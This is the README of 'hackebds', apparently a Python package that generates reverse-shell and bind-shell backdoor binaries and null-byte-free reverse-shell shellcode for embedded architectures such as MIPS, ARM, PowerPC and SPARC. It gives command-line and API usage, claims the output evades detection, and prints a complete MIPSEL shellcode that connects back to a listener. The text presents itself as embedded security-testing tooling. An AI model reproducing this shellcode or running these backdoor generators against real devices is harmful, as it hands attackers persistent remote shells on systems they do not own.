# hackebds
![PyPI - Downloads](https://img.shields.io/pypi/dm/hackebds)![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)


>在嵌入式设备的渗透和漏洞挖掘过程中，遇到了许多问题。一个是一些设备没有telnetd或ssh服务来获得交互式shell，一些设备被防火墙保护，无法与其正向连接需要reverse_shell，另一个是内存损坏漏洞（如堆栈溢出）通常是空字节截断，因此构造反向shell代码更麻烦，因此开发此工具是为了利用该漏洞。该工具基于PWN模块开发，目前使用python2语言， 语言已更新到python3，在python3下使用即可，请尽可能在python3.6版本或更高版本使用此工具


### 功能

该工具嵌入到设备的安全测试中。有两个主要功能：
1. 生成各种架构的**后门程序**。后门程序是用反向shell汇编代码打包的，大小很小，且纯静态封，装**现在支持Armv5、Armv7、Armv8、mipsel和mips，mips64，mips64el，powerpc仍在更新中，powerpc64，sparc，riscv64**
2. 在攻击过程中生成各种架构的**反向shell代码**，且无空字节，这有助于攻击嵌入式设备上的内存损坏漏洞**现在支持Armv5、Armv7、Armv8、mipsel和mips，mipsel64，aarch64，sparc，仍在更新中**
3. 修复了reverse_shellcode和reverse_backdoor**端口选择过大**的一些错误，**在x86和x64**、**下增加了使用指定端口和密码生成bindshell的功能，并美化了生成过程****（此功能将更新到各种架构）**
4. 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
5. 在利用过程中生成各种架构的reverse_shell shellcode，并且没有空字节，这有助于利用嵌入式设备上的内存损坏漏洞。Armv5、Armv7、Armv8、mipsel、mips、mips64、mips64el、powerpc、powerpc64现在支持，它们仍在更新中

6. 修复了reverse_shellcode和reverse_backdoor端口选择太大的一些错误，并在x86和x64下添加了生成具有指定端口和密码的绑定壳的功能，并美化了生成过程**（此功能将更新到各种架构）**添加支持armvelv7_bind_shell（2022.10.27），

7. 删除了shellcode的生成睡眠时间，并添加了mips_ bind_ Shell，x86和x64 small end_ shell_ Backdoor的反向，预计将被mips_ bind_ Shell中断的mips，解决了mips中绑定shell中的密码逻辑处理错误，加入aarch64_ bind_shell

8. 支持命令行生成后门和外壳代码，具有很强的反狩猎能力，以轻巧、小、高效和快速为特征

9. 添加了设备模型的学习功能。建立模型和拱门之间的关系后，再次生成目标内容。您只需要指定模型

10.添加CVE检索功能，并备份CVE检索

11.改进了x86、x64、armebv5、reverse_ shellcode和reverse_ shell_文件



### 安装
安装模块，如果需要使用命令行工具请使用sudo安装

```
sudo pip(3) install -U hackebds
```
如果想在macos下使用此工具不需要使用sudo，但由于MAC的SIP保护，需要将安装python版本的bin目录写入到bashrc(或者其他shell)环境变量下，然后source ~/.bashrc

```
echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
```

![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)

![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)

### 安装问题

出现python如下图问题请安装对应的binutils环境，在github的readme中有mac的下载方法，debian使用apt安装即可

#### 第一步

如果出现如下的错误

![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)

请使用如下命令解决
```
ubuntu（debian）
	apt search binutils | grep arm(这里的arm可以更换需要的对应架构)
	apt install binutils-arm-linux-gnueabi/hirsute
 MacOS:
 	 https://github.com/Gallopsled/pwntools-binutils
 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
```
### 怎么使用
这里的ip地址与端口都是shell弹回的地址与port，导入此模块后pwn模块也会直接导入，无需再次导入
#### 1. 生成对应各种架构的后门程序，纯shellcode封装（无需编译器的加入），回连shell成功概率大
32为程序bind_shell中密码最多4个字符，64位程序最多8个字符
使用命令行生成后门文件名、shellcode、binshell，cmd_file等
 ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)

   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
   ```

   ![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)
   ```
   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
   ```
   ![image-20221102183017775](https://img-blog.csdnimg.cn/img_convert/660574b30d7ae810cc7b0d96a3a60bd2.png)

   ```
   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231
   ```
   ![image-20221102182939434](https://img-blog.csdnimg.cn/img_convert/05ebc0b42efcb42f58eef4815b3b08dc.png)



 ~~生成执行指定命令的程序文件，需要注意的由于执行的是execve系统调用需要指定执行文件的完整路径才能正常执行~~

生成cmd_file功能被更新，只需要指定-cmd参数即可生成各种架构执行对应命令的程序（不需要指定-cmd_path如果需要指定执行的文件可以指定cmd_path执行），同样-envp可以在执行的命令中添加环境变量(riscv，powerpc，armv5，mips64暂时不支持添加环境变量)

```
hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
```

![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)

在指定型号生成后门的功能中加入了输出型号与架构对应的列表关系，方便使用者观察修改

![image-20230106153942787](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153942787.png)


```
>>> from hackebds import *
>>> mipsel_backdoor(reverse_ip,reverse_port)
>>> mips_backdoor(reverse_ip,reverse_port)
>>> aarch64_backdoor(reverse_ip,reverse_port)
>>> armelv5_backdoor(reverse_ip,reverse_port)
>>> armelv7_backdoor(reverse_ip,reverse_port)
>>> armebv5_backdoor(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_backdoor(reverse_ip,reverse_port)
>>> mips64el_backdoor(reverse_ip,reverse_port)
>>> x86el_backdoor(reverse_ip,reverse_port)
>>> x64el_backdoor(reverse_ip, reverse_port)
>>> sparc_backdoor(reverse_ip, reverse_port)#big endian
>>> powerpc_backdoor(reverse_ip, reverse_port)
>>> powerpcle_backdoor(reverse_ip, reverse_port)
>>> powerpc64_backdoor(reverse_ip, reverse_port)
>>> powerpc64le_backdoor(reverse_ip, reverse_port)
>>> x86_bind_shell(listen_port, passwd)
>>> x64_bind_shell(listen_port, passwd)
>>> armelv7_bind_shell(listen_port, passwd)
>>> aarch64_ bind_ shell(listen_port, passwd)
>>> mips_bind_shell(listen_port, passwd)
>>> mipsel_bind_shell(listen_port, passwd)
>>> sparc_bind_shell(listen_port, passwd)
>>> powerpc_bind_shell(listen_port, passwd)
```
列如:
```
>>> mipsel_backdoor("127.0.0.1",5566)
mipsel_backdoor is ok in current path ./
>>> 
```
![image-20221026181947194](https://img-blog.csdnimg.cn/img_convert/ad35bd8fc68cb44da974d7e28ac0cfe9.png)
```
>>> from hackebds import *
>>> x64_bind_shell(13000,"1235")
[+] bind port is set to 13000
[+] passwd is set to '1235'
[*] waiting 3s
[+] x64_bind_shell is ok in current path ./
```
![image-20221026182024685](https://img-blog.csdnimg.cn/img_convert/6d3d5e15bbaac7a91e98d290aa88c074.png)
#### 2. 生成对应各种架构的利用回连shellcode(no free无空字节
```
>>> from hackebds import *
>>> mipsel_reverse_sl(reverse_ip,reverse_port)
>>> mips_reverse_sl(reverse_ip,reverse_port)
>>> aarch64_reverse_sl(reverse_ip,reverse_port)
>>> armelv5_reverse_sl(reverse_ip,reverse_port)
>>> armelv7_reverse_sl(reverse_ip,reverse_port)
>>> armebv5_reverse_sl(reverse_ip,reverse_port)
>>> armebv7_backdoor(reverse_ip,reverse_port)
>>> mips64_reverse_sl(reverse_ip,reverse_port)
>>> mips64el_reverse_sl(reverse_ip,reverse_port)
>>> android_aarch64_backdoor(reverse_ip,reverse_port)
>>> x86el_reverse_sl(reverse_ip,reverse_port)
>>> x64el_reverse_sl(reverse_ip,reverse_port)
>>> ppc_reverse_sl(reverse_ip,reverse_port)
>>> ppcle_reverse_sl(reverse_ip,reverse_port)
>>> ppc64_reverse_sl(reverse_ip,reverse_port)
>>> ppc64le_reverse_sl(reverse_ip,reverse_port)
```
列如:
```
>>> from hackebds import *
>>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
[+] No NULL byte shellcode for hex(len is 264):
\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
```
## chips and architectures

Tests can leverage chips and architectures

Mips:
MIPS 74kc V4.12 big endian,
MIPS 24kc V5.0  little endian, (Ralink SoC)
Ingenic Xburst V0.0  FPU V0.0  little endian

Armv7:
Allwinner(全志)V3s

Armv8:
Qualcomm Snapdragon 660

Powerpc, sparc: qemu

## 更新 

> 				2022.4.29 在hackebds-0.0.5中加入了对aarch64无空字节reverse_shellcode的支持
> 			
> 				2022.5.1  更新在引入模块后可以直接调用，减少代码量,更改对python3的支持
> 			
> 				2022.5.5  0.0.8版本解决了mips_reverse_sl与mipsel_reverse_sl反弹不了shell的bug加入了mips64大小端的后门与reverse_shell功能
> 			
> 				2022.5.21 0.0.9版本更改了armelv5后门生成的方式，加入了riscv-v64的后门指定生成
> 			
> 				2022.6.27 0.1.0 加入了安卓手机后门的生成
> 			
> 				2022.10.26 0.1.5修复了一些问题，并添加了一些bindshell指定端口密码的自动生成功能
> 			
> 				2022.11.2 0.2.0 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
> 			
> 				2022.11.2 0.20 删除了shellcode的生成睡眠时间，并添加了mips_bind_Shell，与x86和x64小端Shell_Backdoor相反，这些mips预计会被mips_biind_Shelll中断，这解决了mips中bindshell中密码逻辑处理的错误问题
> 			
> 				2022.11.8 0.2.2 完善了后门，shellcode，bin_shell的生成修复了一些小错误，增加了学习模块指定型号即可生成对应内容。
> 			
> 				2022.11.6 0.2.8 加入了sparc_bind_shell与powerpc_bind_shell文件生成功能，修复了一些bug
> 				
> 				2023.1.6  0.3.0 修复了cmd_file中生成执行指定命令程序的功能bug，加入了model->arch 的列表，安卓的bind_shell文件
>

## :beer: 享受hacking

## 版本列表
| VERSION                                                      | PUBLISHED    | DIRECT VULNERABILITIES |
| ------------------------------------------------------------ | ------------ | ---------------------- |
| [0.3.0](https://security.snyk.io/package/pip/hackebds/0.3.0) | 6 Jan, 2023  | 0C0H0M0L               |
| [0.2.9](https://security.snyk.io/package/pip/hackebds/0.2.9) | 26 Dec, 2022 | 0C0H0M0L               |
| [0.2.8](https://security.snyk.io/package/pip/hackebds/0.2.8) | 6 Dec, 2022  | 0C0H0M0L               |
| [0.2.7](https://security.snyk.io/package/pip/hackebds/0.2.7) | 22 Nov, 2022 | 0C0H0M0L               |
| [0.2.3](https://security.snyk.io/package/pip/hackebds/0.2.3) | 15 Nov, 2022 | 0C0H0M0L               |
| [0.2.2](https://security.snyk.io/package/pip/hackebds/0.2.2) | 8 Nov, 2022  | 0C0H0M0L               |
| [0.2.1](https://security.snyk.io/package/pip/hackebds/0.2.1) | 7 Nov, 2022  | 0C0H0M0L               |
| [0.2.0](https://security.snyk.io/package/pip/hackebds/0.2.0) | 2 Nov, 2022  | 0C0H0M0L               |
| [0.1.9](https://security.snyk.io/package/pip/hackebds/0.1.9) | 2 Nov, 2022  | 0C0H0M0L               |
| [0.1.6](https://security.snyk.io/package/pip/hackebds/0.1.6) | 27 Oct, 2022 | 0C0H0M0L               |
| [0.1.5](https://security.snyk.io/package/pip/hackebds/0.1.5) | 26 Oct, 2022 | 0C0H0M0L               |
| [0.1.3](https://security.snyk.io/package/pip/hackebds/0.1.3) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.1.2](https://security.snyk.io/package/pip/hackebds/0.1.2) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.1.1](https://security.snyk.io/package/pip/hackebds/0.1.1) | 27 Jun, 2022 | 0C0H0M0L               |
| [0.0.9](https://security.snyk.io/package/pip/hackebds/0.0.9) | 21 May, 2022 | 0C0H0M0L               |
| [0.0.8](https://security.snyk.io/package/pip/hackebds/0.0.8) | 5 May, 2022  | 0C0H0M0L               |
| [0.0.7](https://security.snyk.io/package/pip/hackebds/0.0.7) | 30 Apr, 2022 | 0C0H0M0L               |
| [0.0.6](https://security.snyk.io/package/pip/hackebds/0.0.6) | 30 Apr, 2022 | 0C0H0M0L               |
| [0.0.5](https://security.snyk.io/package/pip/hackebds/0.0.5) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.4](https://security.snyk.io/package/pip/hackebds/0.0.4) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.3](https://security.snyk.io/package/pip/hackebds/0.0.3) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.2](https://security.snyk.io/package/pip/hackebds/0.0.2) | 29 Apr, 2022 | 0C0H0M0L               |
| [0.0.1](https://security.snyk.io/package/pip/hackebds/0.0.1) | 29 Apr, 2022 | 0C0H0M0L               |
